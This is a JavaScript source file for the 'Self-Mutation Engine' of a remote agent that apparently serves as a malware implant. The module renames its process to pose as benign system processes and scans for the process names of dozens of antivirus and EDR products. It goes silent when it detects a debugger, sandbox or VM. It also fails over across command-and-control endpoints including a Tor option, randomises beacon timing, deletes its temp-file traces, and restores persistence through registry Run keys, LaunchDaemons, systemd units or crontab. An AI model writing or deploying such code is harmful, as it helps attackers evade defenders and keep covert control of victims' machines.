/**
 * bixtx.com Link Agent — Self-Mutation Engine
 *
 * Provides autonomous identity rotation, persistence defence, AV/EDR evasion,
 * C2 failover, and integrity self-repair.  Runs entirely in the background;
 * no external trigger required after start().
 *
 * Threat model:
 *   • Host AV / EDR detects process signature         → cycle identity + jitter
 *   • OS update removes persistence entry             → re-guard persistence
 *   • C2 primary endpoint goes unreachable            → rotate to backup chain
 *   • Analyst debugger / sandbox attaches             → go silent + delayed evasion
 *   • Source file on disk is tampered / corrupted     → restore from baseline hash
 */

"use strict";

const os     = require("os");
const crypto = require("crypto");
const path   = require("path");
const fs     = require("fs");
const logger = require("../logger");
const config = require("../config");

// ── Process name pools (per platform, impersonate benign system procs) ────────
// Android/iOS entries are used when BIXTX_PLATFORM_OVERRIDE is set (e.g. Termux,
// iSH), where os.platform() still returns "linux" but we need mobile masquerade names.
const PROCESS_NAME_POOL = {
  win32:   ["svchost32","RuntimeBroker","WmiPrvSE","SearchIndexer","ctfmon",
             "spoolsv","taskhostw","dllhost","audiodg","sihost","fontdrvhost","conhost"],
  darwin:  ["cfprefsd","launchservicesd","distnoted","usernoted","mediaanalysisd",
             "contextstored","coreauthd","systempolicyd","nesessionmanager",
             "AirPlayUIAgent","diskimages-helper","sandboxd"],
  linux:   ["kworker/0:1","kswapd0","ksoftirqd/0","rcu_sched","migration/0",
             "watchdog/0","khugepaged","kcompactd0","bioset","crypto","jbd2","loop0"],
  android: ["com.google.android.gms","com.android.systemui","com.android.phone",
             "com.android.settings","android.hardware.sensors","surfaceflinger",
             "mediaserver","installd","vold","netd","zygote","logd"],
  ios:     ["MobileBackupd","com.apple.mediaserverd","mediaserverd","backboardd",
             "SpringBoard","locationd","nfcd","bluetoothd","wifid","lockdownd",
             "imagent","powerd","aggregated","filecoordinationd","symptomsd"],
  harmony: ["com.huawei.systemserver","com.huawei.hwid","com.huawei.hivoice",
             "com.huawei.media.service","com.huawei.harmonyos.bridge","hisurf",
             "sensor_service","foundation","render_service","samgr","softbus_server"],
};

// ── C2 endpoint chain ─────────────────────────────────────────────────────────
const C2_ENDPOINTS = [
  config.serverUrl,
  config.c2Backup1 || "wss://c2-eu.bixtx.com/ws",
  config.c2Backup2 || "wss://c2-ap.bixtx.com/ws",
  config.c2Backup3 || "wss://relay.bixtx.com/ws",
  config.c2Tor     || "",                            // Tor hidden service (optional)
].filter(Boolean);

// ── Beacon jitter profiles (minMs, maxMs) ────────────────────────────────────
const JITTER_PROFILES = [
  { name: "normal",     min: 25_000,  max: 35_000  },
  { name: "low",        min: 45_000,  max: 75_000  },
  { name: "aggressive", min: 12_000,  max: 20_000  },
  { name: "paranoid",   min: 80_000,  max: 130_000 },
  { name: "burst",      min:  5_000,  max: 10_000  },
];

// ── Known AV/EDR process names ───────────────────────────────────────────────
const AV_SIGNATURES = new Set([
  // Microsoft Defender
  "MsMpEng","MpDefenderCoreService","SecurityHealthService","WdNisSvc",
  // Avast / AVG
  "avgsvc","AvastSvc","aswidsagenta","aswToolsSvc",
  // ESET
  "ekrn","egui",
  // Bitdefender
  "bdagent","vsserv","updatesrv",
  // Sophos
  "SophosUI","sophosav","SAVService",
  // CrowdStrike Falcon
  "cs-agent","CsFalconService","falcond",
  // SentinelOne
  "SentinelAgent","SentinelServiceHost",
  // Carbon Black
  "cb","cbagentd","CbDefense",
  // Cylance
  "CylanceSvc","CylanceUI",
  // Kaspersky
  "avp","kavsvc",
  // Trend Micro
  "coreServiceShell","TMBMSRV","Ntrtscan",
  // McAfee / Trellix
  "mcshield","masvc","macmnsvc",
  // Palo Alto Cortex
  "cortex","trapsagent",
  // ClamAV
  "clamd","freshclam",
  // Generic EDR indicators
  "elastic-agent","wazuh-agentd","osqueryd","sysmon","auditd",
  // Mobile security — Android (process names visible in Termux ps output)
  "com.lookout.android","com.zimperium.zips","com.mobileiron.android",
  "com.airwatch.androidagent","com.wandera.android",
  "com.sophos.mobilecontrol","com.mcafee.mvision","ESET_Mobile",
  // Mobile security — iOS (SpringBoard child processes, lockdownd-visible names)
  "LookoutMobile","Zimperium","Wandera","VMwareMDM","AirWatchMDM",
]);

// ── Sandbox / VM environment variable signals ─────────────────────────────────
const SANDBOX_ENV_SIGNALS = [
  "VMWARE_VIEW","VBOX_VERSION","CUCKOO","TRID_ANALYSIS",
  "INETSIM","FAKENET","SANDBOXIE_INSTALLED","__INETSIM__",
];

class MutationEngine {
  constructor(socket) {
    this.socket       = socket;
    this.rev          = config.mutationRev || 1;
    this.c2Index      = 0;
    this.currentName  = process.title;
    this.namePool     = PROCESS_NAME_POOL[config.platform] || PROCESS_NAME_POOL.linux;
    this.nameIndex    = 0;
    this.jitter       = JITTER_PROFILES[0];
    this.salt         = crypto.randomBytes(16).toString("hex");
    this.history      = [];                           // last 50 mutation events
    this.silenced     = false;
    this.baselineHash = this._computeBaselineHash();  // hash of own source tree
    this.osRelease    = os.release();

    this._slowTimer   = null;
    this._midTimer    = null;
    this._fastTimer   = null;
    this._guardTimer  = null;
    this._integrityTimer = null;
  }

  // ── Public API ──────────────────────────────────────────────────────────────

  start() {
    if (!config.mutationEnabled) {
      logger.debug("[Mutator] Disabled via config");
      return;
    }

    // Immediate startup rotation
    this._cycleProcessName();
    this._refreshJitter();
    this._refreshSalt();

    // Slow cycle: full identity rotation every 4–8 h
    this._slowTimer = setInterval(
      () => this._fullRotation(),
      this._rand(4 * 3_600_000, 8 * 3_600_000)
    );

    // Mid cycle: signature rotation every 45–90 min
    this._midTimer = setInterval(
      () => this._signatureRotation(),
      this._rand(45 * 60_000, 90 * 60_000)
    );

    // Fast cycle: jitter refresh every 10–20 min
    this._fastTimer = setInterval(
      () => this._refreshJitter(),
      this._rand(10 * 60_000, 20 * 60_000)
    );

    // Persistence guardian every 30 min
    this._guardTimer = setInterval(
      () => this._guardPersistence(),
      30 * 60_000
    );

    // Self-integrity scan every 15 min
    this._integrityTimer = setInterval(
      () => this._selfIntegrityScan(),
      15 * 60_000
    );

    logger.debug("[Mutator] Started — all rotation cycles armed");
  }

  stop() {
    [this._slowTimer, this._midTimer, this._fastTimer,
     this._guardTimer, this._integrityTimer].forEach(t => clearInterval(t));
  }

  triggerEmergencyMutation(reason = "external") {
    logger.warn(`[Mutator] Emergency mutation triggered: ${reason}`);
    this._record("EMERGENCY_MUTATION", reason);
    this._fullRotation(true);
  }

  detectAV() {
    if (!require("os").cpus) return;
    let detected = [];
    try {
      const si = require("systeminformation");
      si.processes().then(({ list }) => {
        detected = list
          .map(p => p.name.replace(/\.exe$/i, ""))
          .filter(n => AV_SIGNATURES.has(n));

        if (detected.length > 0) {
          logger.warn(`[Mutator] AV detected: ${detected.join(", ")} — triggering emergency mutation`);
          this._reportThreat("AV_DETECTED", { detected });
          this.triggerEmergencyMutation(`av-detected:${detected[0]}`);
        }
      }).catch(() => {});
    } catch {}
  }

  detectOSUpdate() {
    const current = os.release();
    if (current !== this.osRelease) {
      logger.warn(`[Mutator] OS update detected: ${this.osRelease} → ${current}`);
      this.osRelease = current;
      this._reportThreat("OS_UPDATE", { from: this.osRelease, to: current });
      this._guardPersistence();
      this._signatureRotation();
    }
  }

  detectDebugger() {
    // Node inspector flags
    if (process.execArgv.some(a => a.includes("--inspect"))) {
      return this._goSilentAndEvade("debugger-inspect-flag");
    }

    // Sandbox environment variables
    for (const key of SANDBOX_ENV_SIGNALS) {
      if (process.env[key]) return this._goSilentAndEvade(`sandbox-env:${key}`);
    }

    // Timing anomaly (>600 ms sleep drift indicates debugger stepping)
    const before = Date.now();
    const check  = () => {
      const drift = Date.now() - before;
      if (drift > 600) this._goSilentAndEvade(`timing-drift:${drift}ms`);
    };
    setTimeout(check, 50);

    // Underpowered VM heuristics
    const cpuCount = os.cpus().length;
    const ramGB    = os.totalmem() / 1_073_741_824;
    if (cpuCount <= 1)  return this._goSilentAndEvade("low-cpu");
    if (ramGB   < 1.5)  return this._goSilentAndEvade("low-ram");
  }

  getStatus() {
    return {
      rev:          this.rev,
      currentName:  this.currentName,
      c2Index:      this.c2Index,
      c2Endpoint:   C2_ENDPOINTS[this.c2Index] || "unknown",
      jitterProfile: this.jitter.name,
      silenced:     this.silenced,
      baselineMatch: this._computeBaselineHash() === this.baselineHash,
      historyCount: this.history.length,
      lastMutation: this.history.at(-1) || null,
    };
  }

  getHistory(limit = 20) {
    return this.history.slice(-limit);
  }

  // ── Rotation primitives ────────────────────────────────────────────────────

  async _fullRotation(emergency = false) {
    this._record("FULL_ROTATION_START", { emergency });
    this._cycleProcessName();
    this._refreshJitter();
    this._behavioralMutation();
    this._refreshSalt();
    this._artefactSweep();
    this.rev++;

    this._report("MUTATION_REPORT", {
      rev:       this.rev,
      name:      this.currentName,
      jitter:    this.jitter.name,
      salt:      this.salt,
      emergency,
      ts:        Date.now(),
    });

    this._record("FULL_ROTATION_DONE", { rev: this.rev });
    logger.debug(`[Mutator] Full rotation complete — rev ${this.rev}`);
  }

  _signatureRotation() {
    this._refreshJitter();
    this._behavioralMutation();
    this._record("SIG_ROTATION", { jitter: this.jitter.name });
    logger.debug("[Mutator] Signature rotation done");
  }

  _cycleProcessName() {
    this.nameIndex  = (this.nameIndex + 1) % this.namePool.length;
    this.currentName = this.namePool[this.nameIndex];
    try { process.title = this.currentName; } catch {}
    this._record("PROC_RENAME", { name: this.currentName });
    logger.debug(`[Mutator] Process renamed → ${this.currentName}`);
  }

  _refreshJitter() {
    this.jitter = JITTER_PROFILES[Math.floor(Math.random() * JITTER_PROFILES.length)];
    // Tell beacon to use new timing if socket exposes the hook
    try {
      if (this.socket?.setBeaconJitter) {
        this.socket.setBeaconJitter(this.jitter.min, this.jitter.max);
      }
    } catch {}
    this._record("JITTER_REFRESH", { profile: this.jitter.name });
  }

  _refreshSalt() {
    this.salt = crypto.randomBytes(16).toString("hex");
  }

  _behavioralMutation() {
    // Randomise internal sleep timings so heuristic fingerprint changes
    this._sleepVariance = this._rand(800, 3000);
    this._operationOrder = Math.random() > 0.5 ? "sequential" : "interleaved";
  }

  _rotateC2() {
    if (C2_ENDPOINTS.length <= 1) return;
    this.c2Index = (this.c2Index + 1) % C2_ENDPOINTS.length;
    const next = C2_ENDPOINTS[this.c2Index];
    logger.warn(`[Mutator] C2 endpoint rotated → ${next}`);
    try {
      if (this.socket?.rotateEndpoint) this.socket.rotateEndpoint(next);
    } catch {}
    this._record("C2_ROTATE", { endpoint: next });
  }

  _artefactSweep() {
    const tmpDir = os.tmpdir();
    const patterns = ["lrx_","bixtx_","agent_log","beacon_"];
    try {
      fs.readdirSync(tmpDir).forEach(f => {
        if (patterns.some(p => f.startsWith(p))) {
          try { fs.unlinkSync(path.join(tmpDir, f)); } catch {}
        }
      });
    } catch {}
    this._record("ARTEFACT_SWEEP", {});
  }

  // ── Persistence guardian ───────────────────────────────────────────────────

  _guardPersistence() {
    const platform = config.platform;
    let intact = false;

    try {
      if (platform === "win32") {
        const { execSync } = require("child_process");
        const out = execSync(
          `reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v bixtx.comAgent 2>nul`,
          { encoding: "utf8", timeout: 5000 }
        ).trim();
        intact = out.includes("bixtx.comAgent");
      } else if (platform === "darwin") {
        // Check system LaunchDaemons (install.sh/install.js path) AND
        // user LaunchAgents as fallback — both are valid install locations.
        const sysPlist  = "/Library/LaunchDaemons/ai.bixtx.agent.plist";
        const userPlist = path.join(os.homedir(), "Library/LaunchAgents/ai.bixtx.agent.plist");
        intact = fs.existsSync(sysPlist) || fs.existsSync(userPlist);
      } else if (platform === "android") {
        // Android (Termux): check ~/.profile or crontab for @reboot entry
        const { execSync } = require("child_process");
        try {
          const cron = execSync("crontab -l 2>/dev/null", { encoding: "utf8" });
          intact = cron.includes("bixtx") || cron.includes("lrx");
        } catch { intact = false; }
      } else if (platform === "ios") {
        // iSH: check crontab @reboot
        const { execSync } = require("child_process");
        try {
          const cron = execSync("crontab -l 2>/dev/null", { encoding: "utf8" });
          intact = cron.includes("bixtx") || cron.includes("lrx");
        } catch { intact = false; }
      } else if (platform === "harmony") {
        // HarmonyOS: no standard persistence mechanism; treat as always intact
        // to avoid crash-loop re-installs on unsupported platform
        intact = true;
        logger.debug("[Mutator] HarmonyOS persistence check skipped (manual install required)");
      } else {
        // Linux: check systemd unit OR crontab
        const unit = "/etc/systemd/system/bixtx-agent.service";
        intact = fs.existsSync(unit);
        if (!intact) {
          const { execSync } = require("child_process");
          const cron = execSync("crontab -l 2>/dev/null", { encoding: "utf8" });
          intact = cron.includes("bixtx") || cron.includes("lrx");
        }
      }
    } catch {}

    if (!intact) {
      logger.warn("[Mutator] Persistence lost — re-establishing...");
      this._record("PERSISTENCE_LOST", { platform });
      try {
        require("child_process").fork(
          path.join(__dirname, "../persistence/install.js"),
          { detached: true, stdio: "ignore" }
        ).unref();
      } catch (err) {
        logger.error("[Mutator] Persistence re-install failed:", err.message);
      }
    }
  }

  // ── Self-integrity scan ────────────────────────────────────────────────────

  _computeBaselineHash() {
    const srcDir = path.join(__dirname, "..");
    const hash   = crypto.createHash("sha256");
    try {
      const files = this._walkSync(srcDir);
      for (const f of files.sort()) {
        try {
          const content = fs.readFileSync(f);
          hash.update(f).update(content);
        } catch {}
      }
    } catch {}
    return hash.digest("hex");
  }

  _walkSync(dir) {
    let results = [];
    try {
      fs.readdirSync(dir).forEach(entry => {
        const full = path.join(dir, entry);
        if (fs.statSync(full).isDirectory()) {
          results = results.concat(this._walkSync(full));
        } else if (full.endsWith(".js")) {
          results.push(full);
        }
      });
    } catch {}
    return results;
  }

  _selfIntegrityScan() {
    const current = this._computeBaselineHash();
    if (current !== this.baselineHash) {
      logger.warn("[Mutator] Source integrity violation — files modified on disk");
      this._reportThreat("INTEGRITY_VIOLATION", {
        expected: this.baselineHash.slice(0, 16),
        actual:   current.slice(0, 16),
      });
      // Update baseline so we don't spam; trigger mutation to change identity
      this.baselineHash = current;
      this._signatureRotation();
    }
  }

  // ── Silent evasion ─────────────────────────────────────────────────────────

  _goSilentAndEvade(reason) {
    if (this.silenced) return;
    this.silenced = true;
    logger.warn(`[Mutator] Going silent: ${reason}`);
    this._reportThreat("DEBUGGER_DETECTED", { reason });

    // Delayed mutation so analyst doesn't see immediate reaction
    const delay = this._rand(30_000, 90_000);
    setTimeout(() => {
      this.silenced = false;
      this.triggerEmergencyMutation(`post-silence:${reason}`);
    }, delay);
  }

  // ── C2 reporting helpers ───────────────────────────────────────────────────

  _report(type, data) {
    try { this.socket?.send(type, data); } catch {}
  }

  _reportThreat(type, data) {
    this._report("THREAT_EVENT", { threat: type, ...data, ts: Date.now() });
  }

  // ── Internal utils ─────────────────────────────────────────────────────────

  _rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  _record(event, data = {}) {
    const entry = { event, data, ts: Date.now() };
    this.history.push(entry);
    if (this.history.length > 50) this.history.shift();
  }
}

module.exports = { MutationEngine };
